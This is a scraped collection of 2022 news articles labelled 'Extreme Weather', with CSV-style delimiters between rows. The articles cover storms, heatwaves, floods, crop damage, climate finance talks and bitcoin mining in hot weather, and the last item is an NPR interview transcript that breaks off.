Due to their high levels of iron, fiber and certain vitamins, they are still grown in more than 130 countries. Yet they only play a significant role in the diets of some 90 million people in Africa and Asia, and are often regarded as food for the poor.

By comparison, around half the global population relies on rice, and more than one-third on wheat.

The United Nations has declared 2023 as the International Year of Millets, which could lead to changes in how these grains are perceived.

However, substituting peoples' diets with the more commonly consumed rice and wheat could prove challenging.

""Historically, nutri cereals were a part of the diets of many people in India, but that has declined over the last two decades. But now they are seen more commonly in grocery stores and restaurants, as they are a different kind of food and good for your health too,"" said DeFries.

Sorghum, a type of millet, is known as jowar in India

Two walkers caught in a blizzard on Hobart’s Mount Wellington are lucky to be alive, Tasmanian police say.

In all, eight people were retrieved from the summit of the iconic peak after becoming stranded by the driving wind and snow of the extreme weather event.

News of the rescues follows the death of a woman struck by a falling tree in stormy weather on Tasmania’s northwest coast.

Authorities say a group of four walkers became exposed to wild winds and heavy snow at Kunanyi observation point, also known as The Pinnacle, shortly after midday on Saturday.

The party sought help from two other people in the area and the six took refuge in a toilet block until help arrived.

Police, ambulance and Wellington Park rangers trekked through the storm to reach the group and walk them to safety.

Two more walkers also became disorientated in the wind and snow on Saturday evening on the Zig Zag track, just below the peak, and contacted emergency services.

Taken straight to hospital

Police tracked their phones and, along with paramedics, found the pair sheltering behind rocks near a snow-covered track about 10.30pm.

The group was treated at the scene for exposure and assisted down the mountain before being taken to hospital with cold-related injuries and hypothermia.

“All the people involved started with the best intentions but ultimately some were not prepared for the extreme and variable conditions,” Senior Constable Callum Herbert said on Sunday.

“People should heed warnings about walking on the mountain and in alpine areas as both rescues … put themselves and their rescuers at significant risk.”

If the pair had become lost without shelter as night fell on the mountain, Const Herbert said they would “almost certainly have perished if it wasn’t for the tenacity of the rescuers”.

“They were very lucky.”

Police say the 54-year-old woman killed at Beulah late on Saturday afternoon was one of two people trapped under the fallen tree.

Both were treated at the scene.

A 54-year-old man was taken to Launceston General Hospital with serious but non-life-threatening injuries.

A report is being prepared for the coroner.

Weather also matters.

In a recent episode of The Scoop, Marathon CEO Fred Thiel talked through the logistics of Marathon’s new West Texas plant, including how extreme weather conditions affect miner productivity.

As Thiel explains, temperature extremes in both directions have a direct impact on the energy demanded from the grid:

“If it's 105 degrees in Austin, I bet you there's a lot of air conditioning running and it's running 24/7 versus just between 4 and 9. And then, in the opposite weather conditions, when it's really cold, people are running their heaters.”

Still, in these periods of extreme temperature, Thiel says bitcoin mining operations can act as “energy capacitors,” since miners are able to switch off their machines and provide the energy they were consuming directly to the grid.

Marathon has a contract with the Electric Reliability Council of Texas (ERCOT) through which its mining operations can be temporarily halted if the grid needs more power:

“They can just curtail us and then we shut down for an hour or 2 hours, whatever it is they need, and then we come right back online. You can't do that with food processing industries, you can't do it with steel, you can't do it with most manufacturing — it's a very unique, symbiotic relationship that bitcoin mining and the power industry can have in this regard.”

The impact of weather was on display this week with high temperatures in Texas leading to record-breaking usage of power.

As reported by The Block, many Bitcoin miners in the state have set agreements with ERCOT to power down at peak energy demand times. Advocates say this kind of flexibility can be an asset to the grid.

Outside of the fluctuations in energy demand caused by temperature extremes, another way weather affects bitcoin mining is related to overheating the machines themselves, as Thiel explained during the interview:

“Where the high heat affects the mining industry is when the temperature starts getting into the 100 degree range… Then all of a sudden you have to start shutting down miners just because they overheat.”

Marathon is stocking the forthcoming West Texas facility with Bitmain S19 miners, which are rated for operation between 0-40 degrees celsius (32-104 fahrenheit), according to the product specifications from Bitmain’s website.

While the Texas climate is a force to be reckoned with, miners are still able to remain operational for most of the year, according to Thiel:

“When you balance it out over the course of the year, you can most probably even with severe heat spikes and curtailment resulting from that and then cold spells in the winter, you're still most probably over 90% uptime.”

While India’s forecasting and early warning system are excellent at predicting large-scale extreme weather, small-scale weather events like thunderstorms and lightning are posing a challenge.

The Director General (DG) of Meteorology at the India Meteorological Department (IMD), Dr Mrutyunjay Mohapatra, shared this on the occasion of World Environment Day (WED) at the Council of Scientific and Industrial Research-National Institute of Science Communication and Policy Research (CSIR-NIScPR).

Delivering the WED lecture on 6 June, Dr Mohapatra said, “small-scale extreme weather events like thunderstorms, lightning are increasing.” He said that while the number of deaths due to cyclones has reduced significantly, the number of deaths due to lightning has been on the rise. “Every year about 3,000 people die because of lightning.”

Small-scale weather events are, therefore, firmly on the meteorology radar. “The priority is now that not only the large-scale weather systems, but also small-scale weather systems should be targeted,” Dr Mohapatra said.

As for India’s early warning system in general, “India is second to none,” the IMD DG stated.

Dr Mohapatra is affectionately known as the “cyclone man of India” for his cyclone forecasting and early warning prowess, which is said to have helped minimise loss of life during many a cyclone. He leads the cyclone warning division of the IMD.

In his 6 June lecture, he provided a timely, necessary reminder that we, the human beings, are also part of the environment even if it doesn’t seem that way. ""When you say environment, certainly we feel that we are not part of it. It is something which is surrounding all of us. But we are also a part of the environment,” he said.

He explained that while comfort has increased on an individual level over the decades, the environment has degraded. “The comfort is not sustainable. It is becoming threatened by the changes in environment,” he said.",Extreme Weather,2022-06-13 08:35:32

The wild weather on Omahi St – a localised tornado – was one of the more dramatic moments in a day of downpours, thunder and lightning in the Wellington region. There have been flooding, slips, disruption to public transport and power outages throughout Thursday. And there’s a warning more extreme weather could be on the cards for Friday.

Lyn Allday, who’s lived on the Kāpiti Coast for 26 years, was at work mid-Thursday when a tornado tore down a large tree in a neighbouring property on Kapanui Rd in Waikanae. Her partner saw the tree fall onto their own boundary line, totalling their fence and narrowly missing their car.

MetService Heavy rain, hail and damaging winds are expected in many regions through until Friday, while snow is falling in the south.

In Allday’s nearly three decades living on the coast she had never experienced a tornado – and there had now been two in the wider area within the space of two weeks. “[It’s] freaky,” she said.

Overnight the wider Wellington region was hit by a phenomenon called thunderstorm “training”, which initially hit between 1am and 4am Thursday and brought rainfall at 10 times the rate of what’s considered heavy, MetService meteorologist Karl Loots said. The storms lined up one after the next and rolled through the region, with rainfall peaking at a rate of up to 100 millimetres per hour.

Strong winds, heavy rain and widespread flooding continued to batter Wellington, Porirua and Hutt Valley throughout Thursday, causing delays on roads, disruption to public transport, manhole covers to lift, isolated damage to properties and slips in some areas.

MONIQUE FORD/Stuff A fence was totaled in Kāpiti by a tornado.

In Kāpiti at least five houses in Paraparaumu had been reported with roof and structural damage, along with at least two in Waikanae being damaged by falling trees. The occupant of one car had also been moderately injured, according to Fire and Emergency’s Lyn Crosson. The weather also damaged railway barrier arms.

Theresa Joyce was on Kapanui Rd in Waikanae when the tornado hit mid-Thursday. The wind was going in different directions and she felt her house, which suffered minor damage, was about to take off, she said.

Mary Cameron of Beaver Tree Services said the winds had felled trees near its Omahi St premises in Waikanae. “There's a tree through the roof and it smashed our truck window and hurt one of our boys,” she said.

Jericho Rock-Archer/Stuff The Wellington region has been hit by a phenomenon called thunderstorm training, with multiple waves of heavy rain and thunderstorms blowing through.

Talia Hart's side gate in Waikanae was blown off by the tornado. She was watching TV with her daughter in the lounge when it hit. They heard thunder and saw the sky going really dark before and expected to be heavy rain, but the wind started to blow the windows open and they ran straight for the hallway for cover. “It lasted for a couple of minutes.”

The abnormally high rainfall levels caused Wellington Water to discharge partially treated sewage from wastewater treatment plants at Rukutane Point​, Porirua and Waiwhetū​ Stream in Seaview.

Major power outages in Wellington City and parts of the Hutt Valley periodically affected residential properties, Parliament and Wellington Regional Hospital, however these issues were later resolved. While the hospital activated its generators, there was no reported disruption to patient care.

Jericho Rock-Archer/Stuff Bed Bath and Beyond Wellington employees cleaning water out of that store after heavy rain on Thursday.

As night fell on Thursday and some were still recovering from the carnage caused by the weather, the Wellington Regional Emergency Management Office and the region’s local councils told residents to expect more heavy rain and stormy weather overnight Thursday.

A thunderstorm watch was in place for Kāpiti-Horowhenua and Wellington from 3am to 9am Friday, meaning people should be wary driving on twisty roads and stay indoors wherever possible, said Wellington City Council spokesman Richard MacLean.

The overnight storms could bring heavy rain, hail and strong winds of up to 110kmh with the possibility of more small, localised tornados, according to MetService.

WAVERLY, Neb. (KLKN) – Just as farmers wrap up this year’s planting season, some took a hit from Mother Nature on Tuesday night.

“There is a good chance that the taller corn that got shredded up will be hurt real bad,” said Tom Peterson, a farmer in Waverly.

Peterson grows both corn and soybeans and said, “Some of the fields are going to be gone, ruined, and some of them are going to be set back hard.”

After speaking with a few neighbors in the area, Peterson said some were hit a little harder than others. He talked about ways they can move forward after the storm.

“Some guys are going to try and get in and re-plant right away,” Peterson said. “Some guys are going to wait and take a wait and see and some guys are probably just going to say no I’m going to have to rely on some insurance to get me through this year.”

But waiting to see if the crops will survive can be a gamble.

“Seven to 10 days is going to put you at the end of June, and you’re getting kind of to the end of your window to plant anything corn-wise,” he said.

Another struggle for farmers is finding the seeds to re-plant crops.

“Now finding re-plant seed is difficult a lot of times because this time of year it’s been used already,” Peterson said. “Some guys have already replanted some soybeans because we had a little late frost or late almost freeze.”

This season has not been easy for farmers, with drought, wildfires and now extreme weather. Some in our area will have to rely on insurance to make it through the season.

“It doesn’t give you your top end goal but they take a portion of what you normally raise over an average of years and then they will help make up some of that difference,” Peterson said. “It’s not a way to make a living but it will help you survive.”

Despite the damage, farmers are still hoping for more rain throughout the summer.

“Deep underneath where the roots go, it’s a little bit too dry,” Peterson said. “It doesn’t have the deep soil moisture to be able to feed that crop over the summer by itself, so we are going to have to continue to get good rains throughout the summer.”",Extreme Weather,2022-06-08 22:56:48

The best chances for rain and storms will be confined to south Alabama today.

NOAA’s Storm Prediction Center has a Level 1 out of 5 (or marginal) risk for severe weather today for extreme south Alabama (the areas in dark green in the map above). A Level 1 risk means isolated severe storms will be possible.

Rain and storms were drifting southward ahead of a frontal boundary and toward that area on Thursday morning, and they could become strong to severe as temperatures rise today.

The strongest storms could have damaging winds and heavy rain.

More of Alabama will face the risk of seeing severe weather on Friday as today’s front stalls and heads back northward as a warm front. As of Thursday morning it is unclear how far north that front will travel. Areas to the south will be in the most humid air and will have a better chance for severe storms.

All of Alabama will run the risk of seeing rain and storms on Friday, however.

The Storm Prediction Center has a large part of southwest Alabama in a Level 2 (or slight) risk for severe weather. A Level 2 risk means that scattered severe storms will be possible.

Here is Friday’s severe weather outlook:

The areas in yellow will have a Level 2 out of 5 risk for severe weather on Friday. The areas in dark green have a Level 1 risk.

Again, damaging winds and hail will be the main concerns.

The National Weather Service in Mobile said the timeframe for storms in southwest Alabama will be Friday afternoon and evening:

⛈️ 5AM Severe Weather Forecast Update: confidence is increasing that isolated severe storms are possible over much of the local area Friday afternoon and evening, with damaging winds and quarter-size hail the main threats. #mobwx pic.twitter.com/cDbKo5KZVV — NWS Mobile (@NWSMobile) June 9, 2022

Rain and storms will be possible for south Alabama again on Saturday but the Storm Prediction Center doesn’t have any part of Alabama (so far) in a severe weather risk.

Rain chances should back off some during the first part of next week, but watch for the heat to crank up.

Highs in the mid- to upper 90s are not out of the question next week, and combined with humidity could send the heat index above 100 degrees for parts of Alabama, the weather service said.",Extreme Weather,2022-06-09 12:50:00

“We are in a time of climate emergency and we all need to be proactive,” he said.
“These changes in climate increase the risk of extreme weather events, including the excessive flooding experienced in Accra recently, prolonged droughts in northern Ghana and storm surges in coastal communities, especially in the Volta Region, due to rising seas,” he said.
Mr Chasant said the wider scientific understanding was that climate change, in many cases, exacerbated heavy rainfall, increased risks of droughts, and depleted groundwater.
“While we should continue to demand high-quality urban infrastructure and increased flood defense spending, we should not overlook the scientific understanding that the frequency and intensity of these weather events are influenced by climate change,” he said.","The media and civil society organisations (CSOs) have been urged to situate extreme weather events in Ghana in the climate change discourse to amplify public awareness on climate-driven issues.

Mr Muntaka Chasant, a researcher and environmentalist, in an interview with the Ghana News Agency on Friday, explained that climate change, caused by greenhouse gas emissions, had been recognised to contribute to extreme rainfall, hence in mitigating the country’s flooding menace, stakeholders must consider those causes and effects.

“We are in a time of climate emergency and we all need to be proactive,” he said.

“These changes in climate increase the risk of extreme weather events, including the excessive flooding experienced in Accra recently, prolonged droughts in northern Ghana and storm surges in coastal communities, especially in the Volta Region, due to rising seas,” he said.

Mr Chasant said the wider scientific understanding was that climate change, in many cases, exacerbated heavy rainfall, increased risks of droughts, and depleted groundwater.

“While we should continue to demand high-quality urban infrastructure and increased flood defense spending, we should not overlook the scientific understanding that the frequency and intensity of these weather events are influenced by climate change,” he said.

“Regardless of whether a city’s infrastructure is resilient, massive flooding fuelled by man-made climate distortions devastated the most advanced cities in recent years.”

He said moving climate change to the centre of the news agenda, and social conversation in relation to its impacts was important in enlisting public support.

“So, when we talk about flooding in southern Ghana, droughts in the north, or the tidal waves that devastated the Fuveme Community in the Volta Region, we’re in effect talking about the consequences of climate change.”

“Centring the conversation this way has the capacity to enable and accelerate the scale and pace of climate action.”

Mr Chasant recommended protection of Ghana’s forests and a national policy on the sustainability of mangroves and scrubs to mitigate climate change, citing the Sakumo Ramsar Site as one of the areas being degraded through encroachment, which should be discouraged.

“Despite being carbon-rich and the first line of defense against rising sea levels and tidal flooding, the mangrove forest in the Densu Delta in Accra was destroyed for firewood, timber, and fish traps because there was no policy or actions to protect them,” Mr Chasant said.

Similar mangrove deforestation is ongoing in the Ankobra and around the Volta Delta, where harvesting of firewood was a source of livelihood, he said.

“As a blue carbon ecosystem, mangroves absorb carbon dioxide from the atmosphere and store it in their biomass.

This helps to regulate the global climate.”

Mr Chasant said degrading those mangrove habitats shifted their function from carbon sinks to significant sources of greenhouse gas emissions.

“Consequently, we worsen the climate crisis by not protecting these critical coastal forests.”

He called on the authorities to crack the whip, when necessary, to save the country from imminent climate-related catastrophes.",Extreme Weather,2022-06-10 15:16:56

China and Saudi Arabia are currently also not pressing for a loss and damage finance facility, the second official said.
“These areas are not funded by the existing finance facilities of adaptation finance, mitigation finance and Green Climate Fund,” the official said.
“India, as a country extremely vulnerable to climate impacts and experiencing unrelenting heatwaves, participated in the Glasgow Dialogue on loss and damage at the UN climate talks in Bonn.
They specifically demanded a finance facility for addressing loss and damage,” said Harjeet Singh, senior advisor at the Climate Action Network, an advocacy group.","Loss and damage due to climate change is now a lived reality in India that requires massive funding to prepare for disasters by building capacity and strengthening early warning, followed by recovery and reconstruction after extreme weather events, the country’s delegates said in a strong intervention at the ongoing climate conference in Bonn, Germany.

The efforts in India and other developing countries that require these large investments have to be supported by wealthy nations through a loss and damage finance facility, the Indian delegates demanded on Saturday.

India has sent a 10-member delegation to Bonn for the meet during June 6-16 to prepare for the next United Nations climate change conference in November to be held in the resort town of Sharm el-Sheikh in Egypt.

Loss and damage refers to the impacts of extreme weather events like more severe cyclones and slow onset events like sea level rise or glacial retreat.

India intervened strongly three times to emphasise loss and damage and the finances needed to mitigate the impacts of global warming, an environment ministry official in Bonn said on condition of anonymity. “Averting, minimizing and addressing loss and damage is mandated in the Article 8 of the Paris Agreement,” the official pointed out.

Several country groupings including G77 and China, the Alliance of Small Island States, Small Island Developing States and Least Developed Countries pressed for a separate agenda on establishing a separate loss and damage finance facility, the official said.

The view on having a separate financing facility was opposed by the US, Australia and the European Union, which instead pushed the importance of insurance, catastrophe bonds and bilateral assistance during the dialogue, another official said from Bonn. He too declined to be named.

China and Saudi Arabia are currently also not pressing for a loss and damage finance facility, the second official said. Developed countries had opposed the idea of loss and damage finance at the Glasgow climate summit last year because it stresses on accountability from developed nations and points at their historical responsibility in contributing to the climate crisis.

“We also elaborated about our international outreach by the Coalition for Disaster Resilient Infrastructure and Infrastructure for Resilient Island States, and our own national disaster risk reduction strategies,” the official said.

The Indian delegation pointed out that loss and damage pertains to actions before and after the impacts of climate change and are not confined to immediate relief, response and humanitarian aid. “These areas are not funded by the existing finance facilities of adaptation finance, mitigation finance and Green Climate Fund,” the official said.

India’s intervention comes at a time when the country faced one of the most prolonged and severe heatwaves, particularly in northwest and central India. This was referred to in a comment by Indian meteorologists published in the Nature journal on May 21. The authors included M Mohapatra, director-general of the country’s weather office.

The 2022 heatwave spell in India suggested that heightened climate risks could impact economic growth and worsen India’s credit scores, ratings agency Moody’s said on May 23.

The March-April spring heatwaves in India and Pakistan was about 30 times more likely to happen because of climate change, a rapid attribution analysis by an international team of climate scientists who are part of the World Weather Attribution Network revealed on May 23.

The Glasgow Climate Pact of 2021, instead of specifying how finance and compensation will be delivered for loss and damage, decided to establish a dialogue between nations, relevant organizations and stakeholders to discuss the arrangements for the funding of activities to “avert, minimize and address loss and damage associated with the adverse impacts of climate change”.

“India, as a country extremely vulnerable to climate impacts and experiencing unrelenting heatwaves, participated in the Glasgow Dialogue on loss and damage at the UN climate talks in Bonn. They specifically demanded a finance facility for addressing loss and damage,” said Harjeet Singh, senior advisor at the Climate Action Network, an advocacy group. “India also emphasised on more support to strengthen local capacity to respond to climate disasters such as loss of crops, homes and infrastructure to intensifying storms, floods and rising seas and the need for additional finance in building back better.”

“Developing countries have called for compensation from developed countries, while developed countries have sought instead to treat losses and damage as a sub-component of adaptation within the UNFCCC negotiations,” the Grantham Research Institute at the London School of Economics said in a statement. UNFCCC is short for United Nations Framework Convention on Climate Change.",Extreme Weather,2022-06-12 18:28:59

“We’re not worried about the snowpack any more, we’re not worried about the cool spring that has passed, it is just extreme weather,” Wightman said, noting extreme weather will is four to five days of above average heat or a short period of very heavy rainfall.
“If we do get a similar situation [to] 1999, we won’t be reliant on the deploying of temporary flood protection measures.","The City of Kamloops says the weather over the next few seven to 10 days will determine severity of flooding on the Thompson River this year.

Utility Services Manager, Greg Wightman, says if Kamloops doesn’t see an extreme weather event in the near future, the city will be “in significantly better shape than we are right now.”

He said while the latest snowpack numbers – 175 per cent in the North Thompson and 157 per cent in the South Thompson – look “drastic,” the upcoming weather forecast appears to be favourable, at least so far.

“As of right now, with a forecast that could change any moment throughout June, we need to be prepared, and the entire community does for something that could be very drastic,” he added. “Fortunately, since the middle of May, we just haven’t had [extreme weather].”

“We’ve had a couple of thunderstorms roll through town, but we haven’t had an extreme weather event. Looking at the seven-day forecast there doesn’t appear to be anything in there, but obviously that changes daily, so we are going to continue to monitor [things] and just stay as prepared as we can for what is coming down the river.”

Wightman said a high snowpack and delayed snowmelt – both of which Kamloops has experienced this year – are two of the three factors that lead to a bad freshet. Extreme weather is the third.

“We’re not worried about the snowpack any more, we’re not worried about the cool spring that has passed, it is just extreme weather,” Wightman said, noting extreme weather will is four to five days of above average heat or a short period of very heavy rainfall.

The City will be closing boat launches tomorrow with staff also removing the railings from the pier at Riverside Park among other things.

Wightman also says a pair of new dikes at McArthur Island and Riverside Park will protect the infrastructure within the park to a one-in-20-year flooding event, reducing the reliance of temporary flood protection measures seen in years past.

“If we do get a similar situation [to] 1999, we won’t be reliant on the deploying of temporary flood protection measures. We have the infrastructure in place now to protect against that,” Wightman said.

“Getting into next week, certainly into the middle of next week, if we do have some weather, that is when we are going to be seeing our high water, [though] the peak of the river is probably not going to happen until the end of the month, so we got a few weeks left of being worried.”

Speaking during a press conference Thursday, the head of the BC River Forecast Centre, said a number of rivers in the province are vulnerable because of the high snowpack that is expected to melt in the coming weeks.

“We really have turned a corner, so over the last couple of weeks we’re seeing that snow is melting, it’s starting to bring up the rivers around the province,” Dave Campbell said, noting only about 20 per cent of the province’s snowpack has melted, instead of the normal 50 per cent at this time. “Many of them are approaching near capacity for the amount of flow that they can handle.”

“This really brings us into what is going to be the critical window for freshet season across the province over the next two or three weeks. We are expecting that with these rivers full, we are very much vulnerable to any kind of extreme weather pattern that might emerge.”

Environment Canada meteorologist Armel Castellan added temperatures over the next month or so are expected to remain below normal, with wetter weather conditions in Southern B.C. as well.

“This continues the trend that we have started in early April. Cooler and wetter conditions have prevailed very systematically,” he said. “We’ve come closer to seasonal values of late, but we are looking to dip down back to the pattern of unstable and cooler weather.”

Until that risk of flood subsides, Wightman is urging Kamloopsians, especially those who live on or near the river, to protect their properties.

“We’ve made sand and sandbags available for residents and we’re seeing a lot of people take advantage of those resources. This is the time to do it,” he said. “We’ve got a little bit of a window here to be proactive.”

“In a lot of cases, we’ll be deploying temporary flood protection measures if it is going to impact infrastructure or roadways or transportation. But a lot of times, that means that the folks living right on the river are outside of that protection zone,” he added.

“That’s why we make these resources available to people living on the river. And again, the time to do that is now.”",Extreme Weather,2022-06-10 01:15:09

Extreme heat predicted for the San Antonio area this weekend could be exacerbated by a Saharan dust cloud expected to arrive Sunday.

With daily temperatures reaching 100 degrees or more, the National Weather Service has issued an excessive heat warning for portions of the Interstate 35 corridor, including San Antonio, New Braunfels, Kyle, Austin and Georgetown.

Highs of between 102 and 108 degrees and peak heat indexes of between 105 and 109 degrees are projected for South Central Texas on Saturday and Sunday, though Sunday may be a degree or two warmer, according to the NWS. On its website Saturday evening, a high of 103 degrees was recorded at the San Antonio International Airport, reached just before 6 p.m.

What’s more, models indicate a cloud of Saharan dust carried from Africa by trade winds will arrive in the region Sunday, bringing with it warmth, dryness and strong winds, according to the NWS.

The phenomenon, known as the Saharan dust layer, kicks into high gear from mid-June through late June to mid-August, the agency stated.

One silver lining to the dust cloud: it is associated with vivid sunrises and sunsets, according to the NWS.

In light of these extreme weather conditions, which put people and animals at heightened risk for heat illnesses such as heat exhaustion and heat stroke, local and national agencies are taking action.

The city of San Antonio and Bexar County have both opened cooling centers to provide relief to residents in need. The county’s seven centers will remain open through June 14, according to a news release.

The U.S. Department of Labor’s Occupational Safety and Health Administration also has called on San Antonio-area employers to ensure workers have adequate protection indoors and outdoors. Helpful measures could include training workers to recognize the dangers posed by extreme heat and the symptoms of heat illnesses as well as encouraging workers to drink water every 15 minutes and take breaks in the shade frequently.

Robinson mentioned an extraordinary 2014 rain storm over Long Island that took everyone by surprise.","NEW YORK -- Major storms are becoming more common, leaving destruction across our area.

CBS2's Lonnie Quinn looks at what's causing this change in the forecast.

Many of us watch the weather with a different eye these days. It seems more often than not a forecast of rain or snow turns into a major event. All you have to do is look at the precipitation extremes of the last several years.

""It's along the lines of when it rains, it pours,"" David Robinson, New Jersey's State Climatologist at Rutgers University, told Quinn. ""Excessive precipitation events have become more common over the last two decades or so. You can look back in the Northeast to Floyd in '99, Irene was a major event in 2011, and of course, Ida in September 1st of 2021.""

Here's a little more detail: Floyd was a Category-4 hurricane that dropped more than 13 inches of rain. Irene was a tropical storm, but over a 48-hour period, it destroyed hundreds of homes and vital infrastructure.

Last year, Hurricane Ida broke rainfall records, as more than 3 inches fell in just over an hour. Rushing waters flooded subways and streets, and trapped people in their homes.

And only days before Ida hit, there was Henri, landing a one-two punch that devastated the Northeast.

""There was a time we would say, 'Hey, there's a big storm coming,' and people would kind of poo-poo it,"" Quinn asked fellow Meteorologist Joe Rao.

""Whenever we talk about flash flood watch or flash flood advisory or warning, people immediately are going to register in their minds -- 'What happened with Ida? Is this going to be like Ida, in terms of potential flooding?'"" Rao replied.

Quinn joined Rao at the historic Belvedere Castle in Central Park. While it's one of the park's most iconic structure, for more than a century it has also been a critical New York weather recording station.

""We're able to see now storm systems, major storms, mega storms that we're seeing now in recent years, and make comparisons to the storms that we had using, again, this same location, the same equipment 40, 50 years ago, 60 years. We were able to tell whether or not we're seeing greater amounts of rain,"" Rao explained.

It is essential to weather reporting to establish these benchmarks for both daily forecasting and larger weather events.

But even with state-of-the-art technology at Belvedere and in our own station weather center, some storms just defy prediction.

""The forecasting of those very isolated storms that stall and sit in one place is still a long way from coming to any kind of high precision,"" said Robinson.

Robinson mentioned an extraordinary 2014 rain storm over Long Island that took everyone by surprise.

""To know that that would have set up on that particular day and it would have set up over Islip is just beyond our means,"" he said.

That training storm pummeled a relatively small area with nearly 14 inches in less than 24 hours. At its peak, almost two inches of rain fell in just nine minutes.

There will likely be more extreme precipitation in our future, say the experts. One reason: As the Earth gets warmer, more water evaporates from oceans and land, setting a potential scene for wetter weather with all the moisture now being held in the atmosphere.

""We have had extreme weather events since the beginning of time... But we're seeing them now with greater frequency, or with greater magnitude, I'd say,"" Robinson said. ""And we expect to see that pattern continue to increase.""

Meanwhile, the science of forecasting is also getting better. Improving satellites and radar may not prevent dangerous weather, but they can mean earlier warnings to the public, helping to get people out of harm's way.",Extreme Weather,2022-04-22 07:00:00

A panel of the committee heard from agricultural economists Thursday, as lawmakers debate how to structure the federal safety net in the next farm bill, due when current programs expire in 2023.

The debate comes as traditional corn, soy and wheat farmers straddle both sides of inflation and the economic effects from the war in Ukraine. They’re seeing both huge increases in prices for their crops and soaring costs for everything they have to purchase to plant them.

“Since 2018, when the last farm bill was written, farmers have experienced the economic impacts of a trade war with China, marketing and supply chain disruptions caused by the pandemic, historic weather events and now extreme volatility in commodity and input markets,” said Rep. Cheri Bustos, an Illinois Democrat and the chairwoman of the subcommittee that oversees farm commodities.

“This all has implications for the next farm bill,” Bustos added.

Rep. Glenn Thompson, a Pennsylvania Republican, said he wants to pay special consideration to the margins for farmers as members work on the next farm bill. Thompson is the top Republican on the Agriculture Committee and could helm the farm bill process if Republicans take control of the House.

“The bottom line is that agriculture is a business, and at the end of the day, it is not what you bring in but the margin you are left with,” said Thompson. “I have tremendous concerns with where we are headed right now.”

Holes in the safety net

The farm bill includes long-standing safety net programs that offer some risk protection and financial support to American farmers.

That includes crop insurance and farm commodity programs, which pay farmers if crop prices drop. But the programs don’t account for the current challenge for farmers of rising costs for fuel, fertilizer, pesticides, and seeds.

Economists suggested lawmakers consider pilot programs geared to aid farmers struggling in those margins.

“Input costs are increasing and with inflation, you’re going to have intense pressure where that safety net will be weakened,” said Ronald Rainey, director of the University of Arkansas System Division of Agriculture.

The big commodity crops, especially corn and wheat, are seeing high prices — due in part to disruption of a global market that usually has Ukraine and Russia as important players.

Anticipated prices for the 2022 U.S. wheat crop are 50 percent higher than they were in January, according to Joseph Janzen, an agricultural economist at University of Illinois Urbana-Champaign.

Futures prices for corn and soybean prices are also on the rise: 30 percent for corn and 20 percent higher for soybeans.

But agricultural economists told lawmakers that the sky-high prices may give a false impression, since farmers are also paying more than ever for fertilizer and fuel. The benchmark prices on crude oil and U.S. fertilizer prices approximately tripled between January 2021 and March 2022.

Russia and Belarus are also major fertilizer producers and exporters. Those input prices are expected to stay high for the next few years.

“What we know is going to happen, is prices are going to decline but input prices are going to stay up for a while, they always do. And that is going to leave people in a cost-price squeeze,” said Joe Outlaw, co-director of the Agricultural and Food Policy Center at Texas A&M University.

The high fertilizer and energy prices have both short and long-term effects for agriculture. If farmers respond by planting less and using less fertilizer, they will have a smaller harvest — bringing in less income for their farms and potentially exacerbating rising food costs.

Farm bill process

Every five years lawmakers have to reauthorize the farm bill — a laborious process to re-examine the policy and funding structure for federal agriculture and food assistance programs.

The farm bill is unique in that it provides “mandatory” funding for many of the programs it authorizes, so the programs do not have to go through the congressional appropriations process every year. As such, farm bill authorization is a complex and contentious process, as lawmakers debate how and where to spend more money.

Most lawmakers at the subcommittee hearing Thursday did not call for a major overhaul of the longstanding safety net for farm commodities.

“Our main approach to writing a new farm bill should be a cautious one,” said Rep. Rick Allen, a Georgia Republican, noting how chaotic the past few years have been for agriculture and the economy. “We should not make major changes unless we are able to fully evaluate the consequences of those changes.”

But some said they should consider more flexibility and innovation in farm programs to try to address mounting challenges from drought, severe weather and climate change. For instance, more than half of Arizona is in severe drought and an additional 10 percent is enduring extreme drought.

“I have never seen conditions like this with no relief in sight. We have something that has to be overcome, and we can’t do it by half measures,” said Rep. Tom O’ Halleran, an Arizona Democrat.

In addition to the commodity programs, the farm bill includes crop insurance, conservation programs and food assistance programs. The bulk of farm bill spending goes to food programs, like the supplemental nutrition assistance program (SNAP, formerly known as food stamps) for low-income individuals and families.",Extreme Weather,2022-06-13 13:37:13

Why it matters: Extreme weather events are the most tangible, expensive and often deadly ways in which we're experiencing global warming. This past year brought the uncomfortable realization that even scientists' worst-case scenarios don't fully capture what the climate system is already capable of.

Threat level: Some scientists who study extreme weather and climate events see a concerning trend: extremes seem to be outpacing their predictions.

""It seems as if models do underestimate those extremes and particularly these scenarios are really hard to predict and also to prepare for,"" Kai Kornhuber, a climate scientist at Columbia University, told Axios. ""That's kind of a key issue in these discussions.""

""The past year kind of showcased that very extremes, like extreme extremes, are already occurring on a global scale, [and they are] beyond anything people would have expected,"" Kornbhuber said, pointing to the Pacific Northwest heat event.

Driving the news: Scrolling through the list of 2021's billion dollar disasters in the U.S. reads like a tour through the Book of Revelation. There were wildfires so intense and extensive in the West that the sky turned a milky white and orange in New York City.

Hurricanes defied the odds and intensified right up until landfall.

Heat waves shattered records and killed hundreds. And in New York City, a global financial capital, dozens died from heavy rains flooding basement apartments.

Those disasters have galvanized climate activists into pushing for governments to take action to slash emissions of greenhouse gases, but so far that has not translated into success.

In the U.S., the most comprehensive and ambitious climate bill to date is stuck unless President Biden and Sen. Joe Manchin revive their talks and cut a deal.

Globally, negotiators at the COP26 climate summit in Glasgow made frequent mentions of extreme events, but the Glasgow Climate Pact produced no major breakthroughs. It did, however, leave the door open by a sliver to limiting warming to the most ambitious warming scenario.

We will get more insights into the state of our climate when the U.N. Intergovernmental Panel on Climate Change (IPCC) releases three new reports, which are currently slated for September, February and March. While these do not focus specifically on extreme events, they are highly relevant for moving the science forward.

What's next: With carbon dioxide and other planet-warming gases continuing to build up in the atmosphere, it's unlikely this year will feature more tranquil and less impactful conditions.",Extreme Weather,2022-01-03 08:00:00

AYESHA RASCOE, HOST:

Like many Southern states, Texas has been ravaged by extreme weather in the last couple of years - from tornadoes to tens of thousands of acres burned in wildfires. Local media there has called it once-in-a-lifetime weather. Environmental journalist Amal Ahmed joins us now from Dallas to tell us why this is happening. Welcome.

AMAL AHMED: Thanks so much for having me.

RASCOE: So, first of all, tell us what we're actually seeing in terms of weather in Texas.

AHMED: Yeah, so this past spring has been full of tornadoes and wildfires. There were a couple of tornadoes that hit recently in central Texas and then the end of March, also - the March and April has been very hot and dry, so we've seen record wildfires this season - mostly in west Texas and the Panhandle.

RASCOE: And so how is that different from in the past?

